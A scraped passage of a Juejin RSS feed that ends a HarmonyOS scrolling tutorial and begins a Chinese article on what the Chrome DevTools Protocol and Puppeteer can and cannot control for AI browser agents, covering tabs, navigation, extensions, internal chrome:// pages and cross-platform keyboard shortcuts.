    <span class="hljs-keyword">this</span>.isWhiteColor = <span class="hljs-literal">false</span> : <span class="hljs-keyword">this</span>.isWhiteColor = <span class="hljs-literal">true</span>;
  <span class="hljs-comment">// 判断状态栏字体颜色变化</span>
  yOffset &gt; <span class="hljs-keyword">this</span>.statusBarHeight ?
  <span class="hljs-keyword">this</span>.windowModel.setSystemBarContentColor(Constants.StatusBarContentBlackColor) :
  <span class="hljs-keyword">this</span>.windowModel.setSystemBarContentColor(Constants.StatusBarContentWhiteColor);
  <span class="hljs-comment">// 判断导航栏动效变化</span>
  yOffset &gt;= <span class="hljs-keyword">this</span>.statusBarHeight + Constants.MAIN_SCROLLER_OFFSET_STATUS_CHANGE ?
    <span class="hljs-keyword">this</span>.isFlow = <span class="hljs-literal">true</span> : <span class="hljs-keyword">this</span>.isFlow = <span class="hljs-literal">false</span>;
})
</code></pre>
</li>
</ul>
<h3 data-id="heading-3">总结</h3>
<p>本示例使用了<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-references-V5%2Fts-rendering-control-lazyforeach-V5" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-references-V5/ts-rendering-control-lazyforeach-V5" ref="nofollow noopener noreferrer">LazyForEach</a>进行数据懒加载，LazyForEach懒加载可以通过设置cachedCount属性来指定缓存数量，同时搭配<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fbest-practices-V5%2Fbpta-component-reuse-V5" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/best-practices-V5/bpta-component-reuse-V5" ref="nofollow noopener noreferrer">组件复用</a>能力以达到性能最优效果。</p>
<h4 data-id="heading-4">如果您想系统深入地学习 HarmonyOS 开发或想考取HarmonyOS认证证书，欢迎加入华为开发者学堂：</h4>
<h3 data-id="heading-5">请点击→： <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2FclassDetail%2Fd0d15d9039414a8fad9f99ac4a3f5096%3Ftype%3D1%253Fha_source%253Dhmosclass%26ha_sourceId%3D89000248" target="_blank" title="https://developer.huawei.com/consumer/cn/training/classDetail/d0d15d9039414a8fad9f99ac4a3f5096?type=1%3Fha_source%3Dhmosclass&amp;ha_sourceId=89000248" ref="nofollow noopener noreferrer">HarmonyOS官方认证培训</a></h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d55a567a43d2464eba118ff249eb75db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767623898&amp;x-signature=mUGp%2FgSDfDrDFk2Gj8P10%2B6AnFQ%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🦾 可为与不可为：CDP 视角下的 Browser 控制边界]]></title>    <link>https://juejin.cn/post/7589104492883361844</link>    <guid>https://juejin.cn/post/7589104492883361844</guid>    <pubDate>2025-12-29T14:54:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589104492883361844" data-draft-id="7589074117645008931" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🦾 可为与不可为：CDP 视角下的 Browser 控制边界"/> <meta itemprop="keywords" content="前端,浏览器,人工智能"/> <meta itemprop="datePublished" content="2025-12-29T14:54:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="卤代烃"/> <meta itemprop="url" content="https://juejin.cn/user/43636193770071"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🦾 可为与不可为：CDP 视角下的 Browser 控制边界
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/43636193770071/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    卤代烃
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:54:01.000Z" title="Mon Dec 29 2025 14:54:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>如果我们把人类对电脑的所有操作记为全集，那么 Browser, CDP 和 puppeteer 可操作的集合范畴如下：</p>
<ul>
<li><strong>Computer</strong>：所有操作的全集</li>
<li><strong>Browser</strong>：App 层权限，Browser 为了安全，还限制了许多能力，比如说直接操作本地的文件</li>
<li><strong>CDP</strong>：专注于 Debug 能力，浏览器的非调试信息（比如说收藏网页）是没有权限访问的</li>
<li><strong>puppeteer</strong>：基于 CDP 构建，但是有一部分 CDP API 并没有用到，所以能力属于 CDP 的子集</li>
</ul>
<p>在 Browser-Use 场景，不同于 VNC 这种更为通用的投屏方案，CDP 是有能力边界的，所以说知道它擅长什么不擅长什么，对于架构的整体设计和未来演化方向有很大的意义。</p>
<p>下面主要是从浏览器角度出发，列出 CDP(puppeteer) 可以做到的事情，支持难度分类如下：</p>
<ul>
<li><strong>直接支持</strong>：pptr 有封装好的现成的 API</li>
<li><strong>间接支持</strong>：需要组合多个 pptr API/CDP API 实现相关功能</li>
<li><strong>不能支持</strong>：CDP 完全做不到的事情</li>
</ul>
<br/>
<h2 data-id="heading-0">一、浏览器功能</h2>
<p>这部分主要指浏览器级别的全局功能。包括 tabs 管理，页面导航等功能。</p>
<h3 data-id="heading-1">Tabs</h3>
<ul>
<li><strong>必要性</strong>：高</li>
<li><strong>支持度</strong>：间接支持</li>
<li><strong>pptr API</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fapi%2Fpuppeteer.browser.newpage" target="_blank" title="https://pptr.dev/api/puppeteer.browser.newpage" ref="nofollow noopener noreferrer">Browser.newPage()</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fapi%2Fpuppeteer.browser.pages" target="_blank" title="https://pptr.dev/api/puppeteer.browser.pages" ref="nofollow noopener noreferrer">Browser.pages()</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fapi%2Fpuppeteer.page.bringtofront" target="_blank" title="https://pptr.dev/api/puppeteer.page.bringtofront" ref="nofollow noopener noreferrer">Page.bringToFront()</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fapi%2Fpuppeteer.page.close" target="_blank" title="https://pptr.dev/api/puppeteer.page.close" ref="nofollow noopener noreferrer">Page.close()</a></li>
</ul>
<p>Tabs（标签页）是非常重要的一个功能，CDP 的 tabs 相关 API 能力比较弱，puppeteer 也没有做相关的抽象和封装。这就导致想实现 tab 的「新建/更新/切换/关闭」这 4 个基础的功能需要组合多个 CDP API 间接实现。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/988655731ff646f0918fdd525c9b682c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=5d6vUVN6XnKn6kKJyidHA8G5boM%3D" alt="tabs" loading="lazy"/> <br/></p>
<p>还有个问题如果 Tabs 被人拖拽改变了显示顺序，这部分改变 CDP 是无法感知的。比如说上面图的 tabs 是拖拽过的，但是 CDP 直接拿到的顺序是：<code>历史记录，百度一下，你就知道，今日头条</code>，不过这种问题可以忽略。</p>
<h3 data-id="heading-2">Navigate</h3>
<ul>
<li><strong>必要性</strong>：高</li>
<li><strong>支持度</strong>：直接支持</li>
<li><strong>pptr API</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fapi%2Fpuppeteer.page.goback" target="_blank" title="https://pptr.dev/api/puppeteer.page.goback" ref="nofollow noopener noreferrer">Page.goBack()</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fapi%2Fpuppeteer.page.goforward" target="_blank" title="https://pptr.dev/api/puppeteer.page.goforward" ref="nofollow noopener noreferrer">Page.goForward()</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fapi%2Fpuppeteer.page.reload" target="_blank" title="https://pptr.dev/api/puppeteer.page.reload" ref="nofollow noopener noreferrer">Page.reload()</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fapi%2Fpuppeteer.page.goto" target="_blank" title="https://pptr.dev/api/puppeteer.page.goto" ref="nofollow noopener noreferrer">Page.goto()</a></li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/deee411a2b424a2e9feea9b76f71462e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=0gtaBWhY05NnUfnLn7kbURQkpGI%3D" alt="navigate" loading="lazy"/>
Navigate 主要是 Tab 内部导航，包括 back/forward/refresh/goto 4 个最基础的功能。</p>
<p>这部分功能 puppeteer 基于 CDP 的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fchromedevtools.github.io%2Fdevtools-protocol%2Ftot%2FPage%2F%23method-getNavigationHistory" target="_blank" title="https://chromedevtools.github.io/devtools-protocol/tot/Page/#method-getNavigationHistory" ref="nofollow noopener noreferrer">Page.getNavigationHistory</a> 和 <a href="https://link.juejin.cn?target=https%3A%2F%2Fchromedevtools.github.io%2Fdevtools-protocol%2Ftot%2FPage%2F%23method-navigateToHistoryEntry" target="_blank" title="https://chromedevtools.github.io/devtools-protocol/tot/Page/#method-navigateToHistoryEntry" ref="nofollow noopener noreferrer">Page.navigateToHistoryEntry</a> API 做了良好的封装，基本上可以直接拿来使用。</p>
<p>但值得注意的是输入框的联想记录是无法通过 CDP 获取：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc74c7bb13b8419a87eb5f108547986c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=xd3azh2%2Bln%2FnTaiJ%2BGSzXl5M6I4%3D" alt="search" loading="lazy"/></p>
<h3 data-id="heading-3">扩展程序（浏览器插件）</h3>
<ul>
<li><strong>必要性</strong>：中</li>
<li><strong>支持度</strong>：直接支持</li>
<li><strong>pptr API</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fguides%2Fchrome-extensions" target="_blank" title="https://pptr.dev/guides/chrome-extensions" ref="nofollow noopener noreferrer">Chrome Extensions</a></li>
</ul>
<p>可以初始化 browser 的时候就通过 pptr API 直接注入插件。插件能力还是比较重要的，比如说 ad-block，可以屏蔽一些广告的 DOM，让网页更干净，方便模型去定位。</p>
<h3 data-id="heading-4">内部设置页</h3>
<ul>
<li><strong>必要性</strong>：中</li>
<li><strong>支持度</strong>：直接支持</li>
<li><strong>pptr API</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fapi%2Fpuppeteer.page.goto" target="_blank" title="https://pptr.dev/api/puppeteer.page.goto" ref="nofollow noopener noreferrer">Page.goto()</a></li>
</ul>
<p>内部设置页我这里定义为 <code>chrome://</code> 协议开头的页面，比如说 <code>chrome://history/</code> 就是浏览器的历史记录页。这些设置页其实都是以网页为载体的，所以都能被 CDP 捕获到，这些页面有很多，比如还有 <code>chrome://downloads/</code> <code>chrome://extensions/</code> 等。</p>
<p>换句话说，我们只要知道设置页面的 URI 就可以直接 navigate 过去，这个看整体的诉求，可按需支持。</p>













<table><thead><tr><th align="center">History Page</th><th align="center">History Page Screenshot</th></tr></thead><tbody><tr><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a8f9d8fb994415584db3acc0f4cecf9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=ox05ZiNt4YU07opPTFlIrb3e0a4%3D" alt="history-page" loading="lazy"/></td><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60a5b438f153456b8cd5dd0d89f11589~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=GR%2BKt2zincUxRZIX3hrIWuUc3qM%3D" alt="history-page-screenshot" loading="lazy"/></td></tr></tbody></table>
<h3 data-id="heading-5">设置菜单</h3>
<ul>
<li><strong>必要性</strong>：低</li>
<li><strong>支持度</strong>：不支持</li>
</ul>
<p>CDP 无法感知，但这种二级菜单三级菜单入口也比较深，主动改动的情况比较少见，而且其导航到的都是 <code>chrome://</code> 协议开头的内置网页，拿到对应的 URI 后都可以直接 navigate 过去。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bba98d4c2e8040df8c870fb90b7a4c16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=gKb%2Fn48G1ImxqExTPyt2QJuevf4%3D" alt="list" loading="lazy"/></p>
<h3 data-id="heading-6">其它 App 级功能</h3>
<ul>
<li><strong>必要性</strong>：低</li>
<li><strong>支持度</strong>：不支持</li>
</ul>
<p>除了上面常见的功能，还有一些较为冷门，或者说不会影响浏览网页主流程的 App 级功能。比如说：</p>
<ul>
<li>登录 Google 账号的弹窗</li>
<li>标签页分组</li>
<li>阅读模式/阅读清单</li>
<li>......</li>
</ul>
<p>这些都是有可以增强浏览体验，没有也没啥问题的功能。在 AI 场景上，永远是越简单的越健壮，所以这些甜品功能也没必要支持。</p>

























<table><thead><tr><th align="center">登录弹窗</th><th align="center">标签页分组</th></tr></thead><tbody><tr><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b32d9ceef7948689581f8e7b2c7a2e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=UMBf2NAGcFnbmVwNHGMpN3USDTw%3D" alt="login" loading="lazy"/></td><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd1785be866546b59f3bd5686a3bef0f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=aCdksbhyTp714pc71dlIB0Qq3MY%3D" alt="group" loading="lazy"/></td></tr><tr><td align="center"/><td align="center"/></tr><tr><td align="center"><strong>阅读模式</strong></td><td align="center"><strong>阅读清单</strong></td></tr><tr><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e94d41dd8be45eeb3ff4c2b435aaf5d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=k87x2fo1vhRSy7%2F0hQFPl1Nc18I%3D" alt="read-mode" loading="lazy"/></td><td align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f80ffea549c94717b0d93b8e84ab16cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2k5Luj54OD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767624841&amp;x-signature=ik5pvLKhN5%2BLYPpXWHh4Ant1bTk%3D" alt="read-list" loading="lazy"/></td></tr></tbody></table>
<br/>
<h2 data-id="heading-7">二、快捷键</h2>
<ul>
<li><strong>必要性</strong>：高</li>
<li><strong>支持度</strong>：间接支持</li>
<li><strong>pptr API：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fpptr.dev%2Fapi%2Fpuppeteer.keyboard" target="_blank" title="https://pptr.dev/api/puppeteer.keyboard" ref="nofollow noopener noreferrer">Keyboard class</a></li>
</ul>
<p>快捷键是一个较为复杂的问题。</p>
<p>几大操作系统发展了几十年，虽然用的都是同一款键盘，但在快捷键上加入了一堆自己的小心思，所以各操作系统的快捷键本身就有很高的复杂度；CDP 场景下的快捷键，在 macOS 下也需要单独的适配。下面我就这两个方向展开说说。</p>
<h3 data-id="heading-8">跨平台角度</h3>
<p>跨平台角度看，Windows 和 Linux 的常用快捷键还是比较统一的，但是 macOS 就比较特殊。</p>
<p>首先是对于大部份常用快捷键（全选/复制/黏贴 等），在 Mac 上使用的装饰键是 Command（即 <code>Meta</code> 键），但在 Windows/Linux 上为 Ctrl（即 <code>Control</code> 键）。</p>
<p>所以当 LLM 发出一个快捷键的 action 指令时，比如说「全选」快捷键，在工程这端需要做一下兜底，先判断当前运行环境的具体 OS，然后需要把 action 指令做修改以让指令正确的执行：</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-title function_">hotkey</span>(<span class="hljs-string">"ctrl+A"</span>) --&gt; isMacOS? --- <span class="hljs-literal">true</span> ---&gt; <span class="hljs-title function_">keyboard</span>(<span class="hljs-string">'Meta+KeyA'</span>)
                         └------- <span class="hljs-literal">false</span> --&gt; <span class="hljs-title function_">keyboard</span>(<span class="hljs-string">'Control+KeyA'</span>)
</code></pre>
<p>除了这类常见的快捷键，其实还有很多的情况需要去适配。比如说：</p>
<ul>
<li>查看浏览器历史记录：macOS 是 <code>Command+Y</code>，Linux 和 Windows 是 <code>Ctrl+H</code></li>
<li>退出浏览器：macOS 是 <code>Command+Q</code>，Linux 和 Windows 是 <code>Alt+F</code>，然后按 <code>X</code> 键</li>
<li>导航到上个页面：macOS 是 <code>Command+[</code>，Linux 和 Windows 是 <code>Alt+LeftArrow</code></li>
<li>......</li>
</ul>
<br/>
<p>相关的快捷键可以参考官方给的规范：</p>

























<table><thead><tr><th align="left">平台</th><th align="left">支持的快捷键</th></tr></thead><tbody><tr><td align="left">macOS</td><td align="left"><a href="https://link.juejin.cn?target=https%3A%2F%2Fsupport.apple.com%2Fzh-cn%2F102650" target="_blank" title="https://support.apple.com/zh-cn/102650" ref="nofollow noopener noreferrer">support.apple.com/zh-cn/10265…</a></td></tr><tr><td align="left">Windows</td><td align="left"><a href="https://link.juejin.cn?target=https%3A%2F%2Fsupport.microsoft.com%2Fen-us%2Fwindows%2Fkeyboard-shortcuts-in-windows-dcc61a57-8ff0-cffe-9796-cb9706c75eec" target="_blank" title="https://support.microsoft.com/en-us/windows/keyboard-shortcuts-in-windows-dcc61a57-8ff0-cffe-9796-cb9706c75eec" ref="nofollow noopener noreferrer">support.microsoft.com/en-us/windo…</a></td></tr><tr><td align="left">Linux GNOME</td><td align="left"><a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.gnome.org%2Fusers%2Fgnome-help%2Fstable%2Fshell-keyboard-shortcuts.html.en" target="_blank" title="https://help.gnome.org/users/gnome-help/stable/shell-keyboard-shortcuts.html.en" ref="nofollow noopener noreferrer">help.gnome.org/users/gnome…</a></td></tr><tr><td align="left">Chrome</td><td align="left"><a href="https://link.juejin.cn?target=https%3A%2F%2Fsupport.google.com%2Fchrome%2Fanswer%2F157179%3Fhl%3Dzh-Hans%26co%3DGENIE.Platform%253DDesktop" target="_blank" title="https://support.google.com/chrome/answer/157179?hl=zh-Hans&amp;co=GENIE.Platform%3DDesktop" ref="nofollow noopener noreferrer">support.google.com/chrome/answ…</a></td></tr></tbody></table>
<p>这些都很繁琐，除了交给 AI 来写，最好的方式还是只提供基础的适配，然后遇到啥修啥，要不然就是个无底洞。</p>
<h3 data-id="heading-9">CDP 角度</h3>
<p>CDP 因为权限问题，通过它发送的键盘指令，并不是真正的系统键盘指令，可以简单理解为作用域限制在 Chrome 和 Page 内部。而且，我们的 macOS <strong>又出幺蛾子了</strong>。</p>
<p>首先说最基础的「全选」快捷键。在 macOS 上如果你直接发送 <code>Meta+KeyA</code>，你会发现根本不会执行全选操作。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">await</span> page.<span class="hljs-property">keyboard</span>.<span class="hljs-title function_">down</span>(<span class="hljs-string">"Meta"</span>);
<span class="hljs-keyword">await</span> page.<span class="hljs-property">keyboard</span>.<span class="hljs-title function_">down</span>(<span class="hljs-string">"KeyA"</span>);
<span class="hljs-keyword">await</span> page.<span class="hljs-property">keyboard</span>.<span class="hljs-title function_">up</span>(<span class="hljs-string">"KeyA"</span>);
<span class="hljs-keyword">await</span> page.<span class="hljs-property">keyboard</span>.<span class="hljs-title function_">up</span>(<span class="hljs-string">"Meta"</span>); <span class="hljs-comment">// not working in macOS</span>
</code></pre>
<p>具体原因比较复杂，可以参考 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpuppeteer%2Fpuppeteer%2Fissues%2F776" target="_blank" title="https://github.com/puppeteer/puppeteer/issues/776" ref="nofollow noopener noreferrer">#776</a> 和 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpuppeteer%2Fpuppeteer%2Fissues%2F1313" target="_blank" title="https://github.com/puppeteer/puppeteer/issues/1313" ref="nofollow noopener noreferrer">#1313</a>，核心原因如下：</p>
<blockquote>
<p>The first bug here is that we <strong>don't</strong> send nativeKeyCodes, so no real OSX events get made. When sending the nativeKeyCodes, "a" is keyCode 0 and protocol decides not to send a falsey keyCode. After these are fixed, OSX <strong>doesn't</strong> like to perform keyboard shortcuts unless the application has the foreground. And lastly, if Chromium has the foreground, we send the nativeKeyCode, and protocol processes it, the shortcut gets captured by the address bar <strong>instead of</strong> the page.</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpuppeteer%2Fpuppeteer%2Fissues%2F776%23issuecomment-329589760" target="_blank" title="https://github.com/puppeteer/puppeteer/issues/776#issuecomment-329589760" ref="nofollow noopener noreferrer">github.com/puppeteer/p…</a></p>
</blockquote>
<p>可以看到回复在 2017 年，快 10 年了这个问题其实还存在。</p>
<br/>
<p>不过好在对于「全选/复制/粘贴」这些常见的快捷键，CDP 有些别的曲线救国方案。CDP 发送键盘指令的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fchromedevtools.github.io%2Fdevtools-protocol%2Ftot%2FInput%2F%23method-dispatchKeyEvent" target="_blank" title="https://chromedevtools.github.io/devtools-protocol/tot/Input/#method-dispatchKeyEvent" ref="nofollow noopener noreferrer">Input.dispatchKeyEvent</a>，有个额外的 commands 指令，上面有一些<a href="https://link.juejin.cn?target=https%3A%2F%2Fsource.chromium.org%2Fchromium%2Fchromium%2Fsrc%2F%2B%2Fmain%3Athird_party%2Fblink%2Frenderer%2Fcore%2Fediting%2Fcommands%2Feditor_command_names.h" target="_blank" title="https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/editing/commands/editor_command_names.h" ref="nofollow noopener noreferrer">编辑指令</a>可以触发相关的操作，比如说我想执行「全选」操作，我就可以这样写：</p>
